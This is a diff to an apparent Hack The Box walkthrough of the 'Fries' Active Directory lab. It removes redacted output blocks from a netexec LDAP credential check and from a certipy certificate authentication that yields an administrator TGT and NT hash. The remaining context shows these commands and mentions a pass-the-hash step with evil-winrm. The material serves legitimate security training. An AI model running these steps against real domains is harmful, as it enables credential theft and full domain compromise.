@@ -709,13 +709,6 @@ netexec ldap <IP> -u svc_infra -p 'm6tnXXXXXXXXXXXX'
 
 ![Facts](htb_fries_svc_infra_cred_ldap.png)
 
-Info:
-
-```
-LDAP        10.10.XX.XX     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
-LDAP        10.10.XX.XX     389    DC01             [+] fries.htb\svc_infra:m6tnXXXXXXXXXXXX
-```
-
 They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.
 
 ```shell
@@ -898,25 +891,6 @@ ntpdate fries.htb ; certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -user
 
 ![Facts](htb_fries_adminTGT.png)
 
-
-Info:
-
-```
-2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.XX.XX s1 no-leap
-CLOCK: time stepped by 2178.775048
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
-
-[*] Certificate identities:
-[*]     SAN UPN: 'administrator@fries.htb'
-[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
-[*] Using principal: 'administrator@fries.htb'
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saving credential cache to 'administrator.ccache'
-[*] Wrote credential cache to 'administrator.ccache'
-[*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cbXXXXXXXXXXXXXXXXXXXXXXXXXX
-```
 
 It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` with `evil-winrm`.
 
